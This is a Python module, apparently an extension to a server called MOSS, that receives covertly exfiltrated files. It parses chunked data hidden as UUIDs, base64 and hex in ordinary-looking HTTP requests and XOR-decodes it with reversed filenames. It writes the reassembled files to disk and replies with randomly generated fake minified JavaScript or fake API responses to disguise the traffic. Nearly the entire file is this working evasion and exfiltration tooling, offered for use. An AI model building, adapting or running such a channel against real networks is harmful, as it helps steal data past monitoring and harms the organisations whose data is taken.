"""
ext/stealthnet.py

---

A sneaky exfiltration module to chunkify and siphon away bytes to MOSS. Define a
profile with a JSON DSL to customise your requests and byte-smuggling action.
The JSON will be understood by both the JS frontend (when sending requests) and
the Python backend (when parsing requests).

Due to the nature of this module, exfiltration is much slower compared to a
simple upload.

Sample profiles have been provided in the ext/stealthnet/profiles/ folder
(extensions for an extension!).
"""

from dataclasses import dataclass, field
import string
import sys
from pathlib import Path
import random
import base64
import binascii
import re
import json
from typing import *

GROUP = "stealthyupload (ext/stealthnet.py)"
MAX_CACHED_UPLOADED_FILE_SIZE = 100_000

def _field(default, group=None, doc="", metadata={}, flags=[], choices=[], **kwargs):
    """Simple wrapper to express fields more conveniently."""
    dwargs = {}
    if type(default).__name__ in ['function', 'type']:
        dwargs["default_factory"] = default
    else:
        dwargs["default"] = default
    return field(**dwargs, metadata=metadata | dict(group=group, doc=doc, flags=flags, choices=choices, **kwargs))

def load_file(path):
    with open(path, "rb") as f:
        return json.load(f)

STATE_VARIABLE = ["chunkNo", "currentIndex", "finalIndex", "retries", "filename", "checksum"]
INT_STATE_VARIABLE = ["chunkNo", "currentIndex", "finalIndex", "retries", "checksum"]
REQUIRED_STATE_VARIABLES = {"currentIndex", "finalIndex", "filename"}

@dataclass
class StealthyUploadMixin:
    stealth_path: str = _field("/upload", group=GROUP, doc="HTTP path which accepts upload payloads")
    stealth_profile_path: str = _field("profile.json", group=GROUP, flags=["--stealth-profile"], doc="The stealth profile to use")
    stealth_no_validate: bool = _field(False, group=GROUP, doc="Skip JSON schema validation. I too like to live dangerously. Note that passing this option does not suppress profile parsing errors, such as missing variables.")

    def __post_init__(self):
        self.uploaded_files = {}

        # Make sure file exists and is valid JSON.
        try:
            profile = self.load_profile(self.stealth_profile_path)
        except (FileNotFoundError, json.decoder.JSONDecodeError) as e:
            self.printerr(f"error loading profile: {e}")
            sys.exit(1)

        self.stealth_profile_str = json.dumps(profile).encode('utf-8')
        
        if not self.stealth_no_validate:
            try:
                import jsonschema
            except ImportError:
                self.printerr(f"stealthnet requires the jsonschema package:")
                self.printerr(f"")
                self.printerr(f"\tpip install jsonschema")
                self.printerr(f"")
                self.printerr(f"If you're not aiming to customise the stealth profile,")
                self.printerr(f"you can skip validation by passing --stealth-no-validate")
                sys.exit(1)
            try:
                jsonschema.validate(profile, JSON_SCHEMA)
            except jsonschema.ValidationError as e:
                self.printerr(f"JSON Schema ValidationError: {e.message}")
                self.printerr(f"Path to error: {e.json_path}")
                sys.exit(1)

        try:
            self.stealth_catalogue = make_catalogue_from_profile(profile)
            self.stealth_decryptor = make_decryptor_from_profile(profile)
        except (KeyError, TypeError, JDSLProfileError) as e:
            self.printerr(f"Error loading profile ({e.__class__.__name__}): {e}")
            sys.exit(1)
        self.printstatus(f"Loaded profile '{self.stealth_profile_path}', {len(self.stealth_catalogue.requests)} requests")

        super().__post_init__()

    def load_profile(self, path):
        try:
            # Try relative path.
            return load_file(Path.cwd() / path)
        except FileNotFoundError:
            # Try default script path.
            return load_file(Path(__file__).parent / "stealthnet" / "profiles" / path)
            
    def list_uploaded_files(self):
        return list(self.uploaded_files)
    
    def get_uploaded_file(self, file):
        return self.uploaded_file.get(file, None)

class StealthyUploadProcessor:
    def do_GET(self, req):
        if req.path == "/favicon.ico":
            return req.send_response(404) # SHUTUP
        if not req.path.startswith(req.server.stealth_path):
            return self.handle_incoming_tx_request(req)
        
        if req.path == req.server.stealth_path:
            file = "index.html"
        else:
            file = req.path[len(req.server.stealth_path):].lstrip('/')
        
        folder = Path(__file__).parent / "stealthnet"
        path = folder / file
        try:
            if not path.resolve(True).is_relative_to(folder.resolve()):
                raise FileNotFoundError()
        except FileNotFoundError as e:
            return self.handle_incoming_tx_request(req)
        
        # TODO: cache index.{html,js} files and hide this dynamic loading behind a --stealth-debug flag
        with open(path, "rb") as f:
            content = f.read()
        
        if str(path).endswith('.js'):
            mime = 'text/javascript'
        else:
            mime = 'text/html'

        # TODO: encrypt the profile?
        content = content.replace(b"{{BASE_URL}}", req.server.stealth_path.encode())
        content = content.replace(b"{{PROFILE}}", req.server.stealth_profile_str)
        req.send_response(200, content=content, mime=mime)
        return True
    
    def handle_fallback(self, req):
        return self.handle_incoming_tx_request(req)
    
    def handle_incoming_tx_request(self, req):
        stealth = self.try_extract_payload(req)
        if stealth is None:
            return stealth

        try:
            request = stealth["request"]
        except KeyError:
            # 502 is reserved by the server
            self.printerr(f"expected request key")
            req.send_response(502)
            return None

        errh = request.on_action("error")
        if not errh:
            self.printerr(f"expected error action")
            req.send_response(502)
            return None
        err_stat = errh["status"]()
        err_tmpl = errh.get("template", "An error occurred: %s")

        try:
            bytes_ = stealth["bytes"]
            currentIndex = stealth["currentIndex"]
            finalIndex = stealth["finalIndex"]
            _filename = stealth["filename"] # For checking key exists.
        except KeyError as e:
            req.send_response(err_stat, content=err_tmpl % f"missing field {e}")
            return True
        if finalIndex <= currentIndex:
            req.send_response(err_stat, content=err_tmpl % "bad order")
            return True
        if len(bytes_) < finalIndex - currentIndex:
            # The computed length (len(bytes_)) should not be less than the actual length (final - current).
            # This serves as a simple error detection.
            # We accept computed len > actual len, because bytes_ could be padded.
            req.send_response(err_stat, content=err_tmpl % "bad length")
            return True
        
        # Checksum, optional, but recommended.
        bytes_ = bytes_[:finalIndex - currentIndex]
        checksum = stealth.get("checksum", None)
        if checksum is not None and djb2_hash(bytes_) != checksum:
            req.send_response(err_stat, content=err_tmpl % "bad check")
            return True
        if checksum is None:
            self.logger.warning(f"No checksum found in request, skipping byte validation")

        # Decrypt.
        bytes_ = req.server.stealth_decryptor.decrypt(bytes_, currentIndex)
        stealth["bytes"] = bytes_

        # Cleanup any missing fields.
        if "chunkNo" not in stealth:
            stealth["chunkNo"] = 0

        self.push_event(req, stealth=stealth)

        if action := request.on_action("retry"):
            retries = stealth.get("retries", 0) # This will keep decreasing based on client-side tracking.
            if retries > 0 and random.random() < 0.5:
                req.send_response(action["status"](), content=action.get("template", ""))
                return True
        
        # Fallback: ok
        if action := request.on_action("ok"):
            status = action["status"]()
            tmpl = action.get("template", "")
            if tmpl == "$fakejs":
                # Randomly generate .js file.
                content = generate_fake_minified_js()
                req.send_response(status, content=content, mime='text/javascript')
            elif tmpl == "$fakeapi":
                if random.random() < 0.8:
                    req.send_json(status, data={
                        "status": "ok"
                    })
                else:
                    req.send_json(status, data={
                        "status": "error",
                        "message": random.choice(["An error occurred", "Internal server error", "Invalid input"])
                    })
            else:
                req.send_response(status)

            return True
        
        # Not processed
        return None
    
    
    def try_extract_payload(self, req) -> Union[None, True, dict]:
        """
        Attempts to convert an incoming request into the original bytes.
        Returns None on failure, True on failure + custom response, dict on success.
        """
        def try_call(f):
            try:
                return True, f()
            except JDSLProfileError as e:
                self.logger.warning(f"while extracting payload: {e}")
                return False, e
        
        cat = req.server.stealth_catalogue
        try:
            # In case multiple matches exist, select the one which returns the
            # most bytes. The idea is that multiple matches arise due to vars,
            # which consume but don't return bytes.
            requests = cat.find(req)
            self.logger.info(f'{req.requestline} --> matches {len(requests)} / {requests[0]}')
            runs = [(conv[1], r) for r in requests if (conv := try_call(lambda: r.parse_request(req)))[0]]

            if len(runs) == 0:
                raise JDSLProfileError(f"matched {len(requests)} requests via quick-match, but failed to deep-match any requests")
            elif len(runs) >= 2:
                # Sort by most bytes, and select the request which can parse the most bytes
                runs.sort(key=lambda x: -len(x[0][0]))
                self.logger.info(f'{len(runs)} runs: {[len(r[0]) for r in runs]}')
                self.logger.info(f'selected: {runs[0][1]}')
                # TODO: better approach is to probably use the checksum, if available
            
            (bytes_, state), request = runs[0]
            return dict(bytes=bytes_, **state, request=request)
        except (JDSLProfileError, KeyError) as e:
            self.logger.error(f"{e.__class__.__name__}: {e}")
        return None
    

def djb2_hash(data: bytes) -> int:
    hash_value = 5381
    for byte in data:
        hash_value = (((hash_value << 5) & 0xFFFFFFFF) + hash_value) + byte
        hash_value &= 0xFFFFFFFF
    return hash_value & 0xFFFFFFFF

DEFAULT_CHAR = b"_"
WHITELIST = (string.ascii_letters + string.digits + "_-.").encode()

def sanitise_filename(s: bytes | str) -> str:
    if type(s) == str:
        s = s.encode("utf-8")
    s = bytes([(c if c in WHITELIST else DEFAULT_CHAR) for c in s])
    return s.decode()


@dataclass
class StealthBytesEventHandler:
    stealth_upload_to: str = _field('dest', group=GROUP, doc="Store uploaded files in this directory")
    simple: bool = _field(False, group="logging", doc="Use simple logging, one line per event")
    # upload_max_size: int = _field(2 * 1024**3, group=GROUP, doc="Max file size accepted. Defaults to 2 GiB")

    def __post_init__(self):
        if self.stealth_upload_to and not (p := Path(self.stealth_upload_to)).exists():
            self.logger.warning(f"upload path did not exist, creating path... (mkdir {self.stealth_upload_to})")
            p.mkdir(parents=True, exist_ok=True)

    def handle_event(self, data):
        stealth = data.get("stealth", None)
        if not stealth:
            return
        
        self.log_to_display(**data, **stealth)
        self.handle_data(**stealth)
    
    def handle_data(self, filename, bytes, currentIndex, finalIndex, **_):
        filename = sanitise_filename(filename)
        file = Path(self.stealth_upload_to) / filename
        file.touch(exist_ok=True) 

        # Compute length based on indices, because bytes may be padded.
        length = finalIndex - currentIndex
        with open(file, "r+b") as f:
            f.seek(currentIndex)
            f.write(bytes[:length])

    def log_to_display(self, event_timestamp, client, filename, chunkNo, currentIndex, finalIndex, bytes, **_):
        c = self.c
        length = finalIndex - currentIndex
        if self.simple:
            self.printe(f"[{event_timestamp.split(' ')[-1]}] {c.GRN}STLTH{c.RST} [{client}] ~~>> {c.YLW}{length} bytes, #{chunkNo}, @{currentIndex}{c.RST} >> {filename}")
            return
        
        status = 'STEALTH'
        self.printe(f"{c.CYN}{status:><12}>{client:>>15}>>>{event_timestamp}{c.RST}")
        self.printe(f"{c.GRN}chunk #{chunkNo} / index @{currentIndex} / &>> {filename}{c.RST}")
        self.printe(f"{c.YLW}{bytes[:length][:40].decode(errors='ignore')}{c.RST}")
        self.printe(f"{c.CYN}{status:><30}{c.RST}\n")


VAR_REGEX = re.compile(r'(\$\{(?:\w+)(?::[a-zA-Z0-9]+)?(?::[0-9]+)?\})')
STRICT_UUID_REGEX = re.compile(r'[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}')

"""-------------
TOKENS
------
You can define your own token formats.

The classes here take care of validating the profile and converting it to bytes.

Mainly, you'll want to define a _tag, _regex, validate(), and to_bytes() members.

- _tag - this is the unique string used to match tokens in a profile, e.g. ${mytag:abc}
- _regex - this is the regex used to tokenise incoming requests
- validate() - raises a JDSLProfileError upon invalid profile. This will be run during init.
- to_bytes() - this parses incoming bytes and does conversion (decryption, if enabled, will be handled later, but not here)
"""

class Token:
    _capture = False

@dataclass
class LiteralToken(Token):
    literal: str
    _tag = "literal"

    @property
    def _regex(self):
        return escape_regex(self.literal)

class IdArgValidator:
    @classmethod
    def validate(cls, *args):
        if len(args) != 1:
            raise JDSLProfileError(f"expected 1 arg for {cls.__name__}, got {args}")
        if not re.match(r'^\w+$', args[0]):
            raise JDSLProfileError(f"expected identifier-like arg for {cls.__name__}, got {args[0]}")

@dataclass
class VarToken(Token, IdArgValidator):
    name: str
    _tag = "var"
    _regex = r'.*'

@dataclass
class StateToken(Token, IdArgValidator):
    state_name: str  # The variable name of the state, e.g. "checksum"
    _tag = "state"

    @property
    def _regex(self):
        if self.state_name in INT_STATE_VARIABLE:
            return r'\d+'
        else:
            return r'[0-9A-Za-z\-_\.]+'

    @classmethod
    def validate(cls, *args):
        super().validate(*args)
        if args[0] not in STATE_VARIABLE:
            raise JDSLProfileError(f"expected state variable to be one of {STATE_VARIABLE}, but got {args[0]}")

    def to_state(self, incoming):
        # This parses incoming state variables.
        # If you want to override how states are transferred, you can edit this function.
        # This should be the only class which defines a `to_state()` method.
        if self.state_name == "filename":
            return incoming[::-1]
        elif self.state_name in INT_STATE_VARIABLE:
            try:
                return int(incoming)
            except ValueError:
                raise JDSLProfileError(f"expected {self.state_name} to be an integer, but got {incoming}")

@dataclass
class UuidToken(Token):
    _tag = "uuid"
    _capture = True
    _regex = r'[0-9A-Fa-f\-]{36}'

    @classmethod
    def validate(cls, *args):
        if len(args) > 0:
            raise JDSLProfileError(f"expected 0 args for {cls.__name__}, got {args}")

    @classmethod
    def to_bytes(cls, s):
        return binascii.unhexlify(s.replace('-', ''))

class DualIntArgValidator:
    @classmethod
    def validate(cls, *args):
        if not (1 <= len(args) <= 2):
            raise JDSLProfileError(f"expected 1-2 args for {cls.__name__}, got {args}")
        if not all(x.isdigit() for x in args):
            raise JDSLProfileError(f"expected numeric args for {cls.__name__}, got {args}")
        if len(args) == 2 and int(args[0]) > int(args[1]):
            raise JDSLProfileError(f"expected arg[0] <= arg[1] for {cls.__name__}, but got {args[0]} > {args[1]}")
    
@dataclass
class UuidListToken(Token, DualIntArgValidator):
    lo: int
    hi: int = None
    _tag = "uuidlist"
    _capture = True
    _regex = r'\[(?:"|%22)([0-9A-Fa-f\-]{36})(?:"|%22)(?:,(?:"|%22)([0-9A-Fa-f\-]{36})(?:"|%22))*\]'

    @classmethod
    def to_bytes(cls, s):
        uuids = STRICT_UUID_REGEX.findall(s)
        return b''.join(binascii.unhexlify(u.replace('-', '')) for u in uuids)

@dataclass
class B64Token(Token, DualIntArgValidator):
    lo: int
    hi: int = None
    _tag = "b64"
    _capture = True
    _regex = r'[A-Za-z0-9+/]+'

    @classmethod
    def to_bytes(cls, s):
        if type(s) == str:
            s = s.encode()
        s = s.replace(b" ", b"+")
        return base64.b64decode(s + b"===")

@dataclass
class HexToken(Token, DualIntArgValidator):
    lo: int
    hi: int = None
    _tag = "hex"
    _capture = True
    _regex = r'[0-9A-Fa-f]+'

    @classmethod
    def to_bytes(cls, s):
        return binascii.unhexlify(s)

def make_token(tag, *args):
    for cls in [VarToken, StateToken, UuidToken, B64Token, HexToken, UuidListToken]:
        if cls._tag == tag:
            cls.validate(*args)
            return cls(*args)
    raise JDSLProfileError(f"unknown tag: {tag}({', '.join(args)})")

class JDSLProfileError(Exception): pass

def escape_regex(s):
    for c in '.(){}[]+*^$&!?':
        s = s.replace(c, '\\' + c)
    return s

@dataclass
class ByteData:
    data: bytes

@dataclass
class StateData:
    name: str
    data: Union[int, str]

class TokenString:
    def __init__(self, tokens, states_needed):
        self.tokens = tokens
        self.states_needed = states_needed

    @staticmethod
    def build(s):
        states_needed = []
        tokens = []
        splat = VAR_REGEX.split(s)
        for x in splat:
            if x.startswith('${'):
                tag, *args = x[2:-1].split(':')
                tok = make_token(tag, *args)
                if tokens and tok._tag != "literal" and tokens[-1]._tag != "literal":
                    # Prevent parsing difficulties later on.
                    raise JDSLProfileError(f"cannot have two non-literal in a row (near {x}, in {s})")
                if tok._tag == "state":
                    states_needed.append(args[0])
                tokens.append(tok)
            else:
                tokens.append(LiteralToken(x))
        return TokenString(tokens, states_needed)
    
    def parse(self, string):
        original_string = string
        gentok = iter(self.tokens)
        try:
            while True:
                tok = next(gentok)
                regex = tok._regex
                if regex == '.*':
                    regex += '?' # Make it greedy.
                    # Grab the next token.
                    try:
                        tok2 = next(gentok)
                    except StopIteration:
                        # Well, it was going to match everything anyways, so I guess we're done!
                        return True
                    regex += tok2._regex
                
                # Match against the target.
                m = re.match('^' + regex, string)
                if m:
                    # Chop off the matched portion.
                    string = string[m.end():]
                else:
                    raise JDSLProfileError(f"failed to parse request for {tok} at {string}\ncontext: {original_string}\nregex: {regex}")
                
                if tok._capture:
                    try:
                        yield ByteData(tok.to_bytes(m.group(0)))
                    except Exception as e:
                        raise JDSLProfileError(f"error occurred while calling to_bytes on '{m.group(0)}': {e}")
                elif type(tok) == StateToken:
                    yield StateData(tok.state_name, tok.to_state(m.group(0)))
        except StopIteration:
            return True # Done!
        
    def match(self, string):
        """Match an entire string against the preloaded tokens."""
        # Build an aggregated regex.
        regex = ''
        for tok in self.tokens:
            r = tok._regex
            if r == '.*':
                regex += r + '?' # greedy
            elif tok._capture:
                regex += f'({r})'
            else:
                regex += r
        
        m = re.match('^' + regex + '$', string)
        return m

class Request:
    def __init__(self, url, *, method="GET", headers={}, body="", on=None, **_):
        self.original = dict(url=url, method=method, headers=headers, body=body)
        self.url = TokenString.build(url)
        self.method = method
        ordered_headers = sorted(headers.items(), key=lambda t: t[0].lower())
        self.headers = {k.lower(): TokenString.build(v) for k, v in ordered_headers}
        self.body = TokenString.build(body)
        on = on or []
        self.on_dict = self._build_actions(on)
        
        states_needed = []
        states_needed += self.url.states_needed
        for v in self.headers.values():
            states_needed += v.states_needed
        states_needed += self.body.states_needed
        self.states_needed = list(set(states_needed))
        
    def _build_actions(self, on):
        on_dict = {}
        for rule in on:
            action = rule["action"].lower()
            on_dict[action] = rule

            status = rule["status"] # Validate key exists
            if type(status) == int:
                on_dict[action]["status"] = lambda: status
            elif type(status) == list and all(type(x) == int for x in status):
                on_dict[action]["status"] = lambda: random.choice(status)
            else:
                raise JDSLProfileError(f"expected on.status to be int or list[int], but got: {status}")

        # Pre-fill default actions.
        if "ok" not in on_dict:
            on_dict["ok"] = {
                "status": lambda: 200,
                "action": "ok",
            }
        if "error" not in on_dict:
            on_dict["error"] = {
                "status": lambda: 400,
                "action": "error",
                "template": "error: %s"
            }
        if "retry" not in on_dict:
            on_dict["retry"] = {
                "status": lambda: 429,
                "action": "retry",
            }
        return on_dict
    
    def on_action(self, action):
        return self.on_dict.get(action, None)
            
    def match(self, req):
        """Attempt to match against an incoming request."""
        return self.method == req.command and self.url.match(req.path)
    
    def parse_request(self, req):
        def you_shall_yield():
            yield from self.url.parse(req.path)
            for k, h in self.headers.items():
                if v := req.headers.get(k.lower(), None):
                    yield from h.parse(v)
            yield from self.body.parse(req.body.decode(errors='ignore'))
        
        bytes_, state = b"", {}
        for datum in you_shall_yield():
            if type(datum) == ByteData:
                bytes_ += datum.data
            elif type(datum) == StateData:
                state[datum.name] = datum.data
            else:
                raise TypeError(f"you idiot sandwich! you made a new internal data type but forgot to implement it here! (no hard feelings)")
    
        return bytes_, state

    def __str__(self):
        return f"Request({self.original['method']} {self.original['url']})"

class RequestCatalogue:
    def __init__(self, common):
        self.requests = []
        self.common = common

    def add_request(self, request):
        self.merge_common(request)
        r = Request(**request)
        if missing_states := REQUIRED_STATE_VARIABLES - set(r.states_needed):
            raise JDSLProfileError(f"in request {r}, missing required states: {missing_states}")
        # TODO: catch invalid variables
        self.requests.append(r)

    def merge_common(self, request):
        c_headers = self.common.get("headers", {})
        r_headers = request.get("headers", {})
        headers = {}
        for k, v in c_headers.items():
            headers[k.lower()] = v
        for k, v in r_headers.items():
            headers[k.lower()] = v
        request["headers"] = headers

    def find(self, req):
        candidates = [r for r in self.requests if (m := r.match(req))]
        # if len(candidates) >= 2:
        #     candidates_str = "\n".join(str(r) for r, _ in candidates)
        #     raise JDSLProfileError(f"(confusion) the request could be matched in multiple ways:\nrequest: {req.requestline}\ncandidate matches: {candidates_str}")

        if not candidates:
            raise JDSLProfileError(f"could not find matching request for incoming request:\n{req.requestline}")
        
        return candidates
        
def make_catalogue_from_profile(prof):
    rc = RequestCatalogue(prof["common"])
    for x in prof.get("intermittent", []):
        req = x["req"]
        rc.add_request(req)
    
    for x in prof.get("cycle", []):
        for req in x["req"]:
            rc.add_request(req)

    return rc

class DefaultDecryptor:
    def decrypt(self, data, index):
        return data

class XorDecryptor:
    def __init__(self, key):
        if isinstance(key, str):
            self.key = key.encode('utf-8')
        else:
            self.key = bytes(key)

    def decrypt(self, data, index):
        result = bytearray(len(data))
        for i in range(len(data)):
            result[i] = data[i] ^ self.key[(index + i) % len(self.key)]
        return bytes(result)

def make_decryptor_from_profile(prof):
    enc = prof.get("encryption", None)
    if not enc:
        return DefaultDecryptor()

    type_ = enc["type"].lower()
    if type_ == "xor":
        key = enc["key"]
        if type(key) not in (str, bytes):
            raise TypeError(f"Unexpected type for encryption.key: {type(key)}")
        if len(key) == 0:
            raise TypeError(f"Unexpected empty encryption.key")
        return XorDecryptor(key)
    else:
        raise TypeError(f"Unrecognised encryption type: {type_}")


# ------------------------------------
# -- JSON Schema
# ------------------------------------

JSON_SCHEMA = {
  "type": "object",
  "additionalProperties": False,

  "anyOf": [
    {
      "required": ["cycle"]
    },
    {
      "required": ["intermittent"]
    }
  ],

  "properties": {

    "metadata": {
      "type": "object",
      "required": ["version"],
      "properties": {
        "version": {
          "type": "integer",
          "description": "Version of the traffic profile"
        },
        "description": {
          "type": "string",
          "description": "Human-readable purpose or name of this traffic profile"
        }
      },
    },

    "encryption": {
      "type": "object",
      "properties": {
        "type": {
          "type": "string",
          "enum": ["xor"]
        },
        "key": {
          "type": "string",
          "minLength": 1,
          "description": "Key used for simple string obfuscation / encryption of payloads"
        }
      },
      "required": ["type"]
    },

    "vars": {
      "type": "array",
      "items": {
        "type": "object",
        "required": ["name", "type", "items"],
        "properties": {
          "name": {
            "type": "string",
            "pattern": "^[a-zA-Z0-9_]+$"
          },
          "type": {
            "enum": ["cycle", "random"]
          },
          "items": {
            "type": "array",
            "items": { "type": "string" },
            "minItems": 1
          }
        },
      }
    },

    "common": {
      "type": "object",
      "additionalProperties": False,
      "properties": {
        "headers": {
          "type": "object",
          "additionalProperties": { "type": "string" },
          "description": "Default headers applied to most requests unless overridden"
        }
      },
    },

    "intermittent": {
      "type": "array",
      "items": {
        "type": "object",
        "additionalProperties": False,
        "required": ["every", "req"],
        "properties": {
          "every": {
            "type": "array",
            "minItems": 2,
            "maxItems": 2,
            "items": { "type": "integer", "minimum": 100 },
            "description": "[minMs, maxMs] interval range"
          },
          "req": {
            "$ref": "#/definitions/request"
          }
        }
      }
    },

    "cycle": {
      "type": "array",
      "items": {
        "type": "object",
        "additionalProperties": False,
        "required": ["count", "delay", "req"],
        "properties": {
          "count": {
            "type": "array",
            "minItems": 2,
            "maxItems": 2,
            "items": { "type": "integer", "minimum": 0 }
          },
          "delay": {
            "type": "array",
            "minItems": 2,
            "maxItems": 2,
            "items": { "type": "integer", "minimum": 0 }
          },
          "maxRetries": {
            "type": "integer",
            "minimum": 0
          },
          "req": {
            "type": "array",
            "items": { "$ref": "#/definitions/request" }
          }
        }
      }
    }
  },

  "definitions": {
    "request": {
      "type": "object",
      "required": ["method", "url"],
      "properties": {
        "method": {
          "enum": ["GET", "HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
        },
        "url": {
          "type": "string",
          "minLength": 1
        },
        "headers": {
          "type": "object",
          "additionalProperties": { "type": "string" }
        },
        "body": {
          "type": "string",
          "minLength": 1
        },
        "repeat": {
          "type": "array",
          "minItems": 2,
          "maxItems": 2,
          "items": { "type": "integer", "minimum": 0 }
        },
        "on": {
          "type": "array",
          "items": {
            "type": "object",
            "required": ["status", "action"],
            "properties": {
              "status": {
                "oneOf": [
                  {
                    "type": "integer",
                    "minimum": 100,
                    "maximum": 999
                  },
                  {
                    "type": "array",
                    "minItems": 1,
                    "items": { "type": "integer", "minimum": 100, "maximum": 999 }
                  },
                ]
              },
              "action": {
                "enum": ["ok", "retry", "error"]
              },
              "template": {
                "type": "string",
                "description": "HTML content to return (special values: $fakejs, $fakeapi)"
              }
            }
          }
        }
      }
    }
  }
}



# ------------------------------------
# -- Random JS Generator
# ------------------------------------

import random
import string

IDENT_START = string.ascii_letters + "_$"
IDENT_CHAR  = IDENT_START + string.digits

KEYWORDS = {
    'break', 'case', 'catch', 'class', 'const', 'continue', 'debugger', 'default',
    'delete', 'do', 'else', 'export', 'extends', 'finally', 'for', 'function',
    'if', 'import', 'in', 'instanceof', 'new', 'return', 'super', 'switch',
    'this', 'throw', 'try', 'typeof', 'var', 'void', 'while', 'with', 'yield',
    'let', 'static', 'await', 'async'
}

def random_ident(len_range=(1,5)):
    length = random.randint(*len_range)
    first = random.choice(IDENT_START)
    rest = ''.join(random.choice(IDENT_CHAR) for _ in range(length-1))
    ident = first + rest
    while ident in KEYWORDS and random.random() < 0.85:
        ident = random_ident(len_range)
    return ident

def random_number():
    return random.choice([
        str(random.randint(-999,9999)),
        f"{random.randint(0,999)}.{random.randint(0,999)}",
        f"0x{random.randrange(0, 1<<32):x}",
        f".{random.randint(1,999)}",
        f"1e{random.choice(['','+','-'])}{random.randint(0,5)}",
        "NaN","Infinity","void 0"
    ])

def random_string():
    style = random.random()
    if style < 0.45:   # normal "
        return f'"{random_string_content()}"'
    elif style < 0.75: # normal '
        return f"'{random_string_content()}'"
    else:              # template-ish
        return f"`${{{random_ident()}}}`"

def random_string_content():
    chars = string.ascii_letters + string.digits + r""" !@#$%^&*()_+-=[]{}|;':",./<>?`~"""
    length = random.choices([0,1,2,3,4,5,6,7,8,10,12,16,24], weights=[1,4,7,10,12,10,8,6,5,4,3,2,1])[0]
    return ''.join(random.choice(chars) for _ in range(length))

def random_token():
    weights = [38, 16, 11, 9, 7, 6, 5, 4, 3, 1]
    choices = [
        lambda: random_ident((1,6)),                              # variables
        lambda: random_number(),
        lambda: random_string(),
        lambda: random.choice('.,;(){}[]?:'),
        lambda: random.choice('+-*/%&|^!~<>='),
        lambda: random.choice(['++','--','+=','-=','*=','/=','||','&&','==','===','!=','!==','<=','>=','=>','**','?.','??','??=']),
        lambda: random.choice(['true','false','null','undefined','this','NaN','Infinity','void 0']),
        lambda: random.choice(['function','return','if','else','for','while','do','switch','case','break','try','catch','finally','throw','new','delete','typeof','instanceof','in','of','await','async','class','extends','super','yield','import','export','default']),
        lambda: random.choice(['Math.','console.','JSON.','Object.','Array.','String.','Promise.','fetch(','document.','window.']),
        lambda: random.choice(['setTimeout(','setInterval(','addEventListener(','removeEventListener(']),
    ]
    return random.choices(choices, weights=weights, k=1)[0]()

def should_glue(prev, curr):
    if not prev: return False
    p, c = prev[-1], curr[0]

    # Very common no-space patterns in minified JS
    if p in '})].' and c in '([.':
        return True
    if p.isalnum() or p in '_$':
        if c.isalnum() or c in '_$':
            return True
    if p in '"\'' and c in '"\'':
        return False  # usually space between strings
    if curr in '.,;)}]':
        return True
    if prev in ['return','throw','new','delete','typeof','void','instanceof','in','of']:
        return False
    return random.random() < 0.72  # aggressive gluing

def generate_minified_js_lines(line_count=50, tokens_per_line=(6,40)):
    lines = []
    in_try_block = False

    for _ in range(line_count):
        tokens = []
        col = 0

        while col < 140 and len(tokens) < random.randint(*tokens_per_line):
            tok = random_token()

            if tokens and should_glue(tokens[-1], tok):
                pass  # no space
            elif random.random() < 0.18:
                tok = ' ' + tok

            tokens.append(tok)
            col += len(tok)

        line = ''.join(tokens)

        # occasional statement enders
        if random.random() < 0.28 and not line.endswith(('{','(','[')):
            line += random.choice([';',';',','])

        # try / catch coordination (very naive)
        r = random.random()
        if r < 0.04 and not in_try_block:
            line = "try{" + line
            in_try_block = True
        elif r < 0.08 and in_try_block:
            line += "}catch(" + random_ident((1,3)) + "){}"
            in_try_block = False

        lines.append(line)

    return lines

def generate_fake_minified_js():
    lines = generate_minified_js_lines(
        line_count = random.randint(40, 160),
        tokens_per_line = (5, 45)
    )

    # ────────────────────────────────────────
    #   Much more realistic header patterns
    # ────────────────────────────────────────
    header_patterns = [
        "(function(){",
        "!function(){",
        "(function(e,t,n){",
        "(function(a,b){return a*b})",
        "function(e,t){",
        "!function(t,e,n,o,i){",
        "(function(){return ",
        "var t,e,n,o,i;",
        "const e=t=>",
        "let $=document.getElementById(",
        "window.onload=function(){",
        '"use strict";',
        "Object.defineProperty(exports,'__esModule',{value:!0});",
        "define(['exports'],(function(exports){",
        "(function(global,factory){typeof exports==='object'&&typeof module!=='undefined'?factory(exports):",
        "(()=>{",
        "export default ",
        "(function(){var e=0;",
        "!function(e){e.exports=function(){",
    ]

    if random.random() < 0.8:
        lines.insert(0, random.choice(header_patterns))

    # Ending flourish (common in IIFEs and bundles)
    endings = [
        ";})();",
        "})();",
        "})();",
        "})(window);",
        "})(this);",
        "})(self);",
        "})(globalThis);",
        "})(typeof window!=='undefined'?window:this);",
    ]

    if random.random() < 0.65 and not lines[-1].strip().endswith('}'):
        lines[-1] = lines[-1].rstrip(';,') + random.choice(endings)

    return '\n'.join(lines)

# if __name__ == "__main__":
#     for _ in range(3):
#         print(generate_fake_minified_js())
#         print("\n" + "─"*70 + "\n")




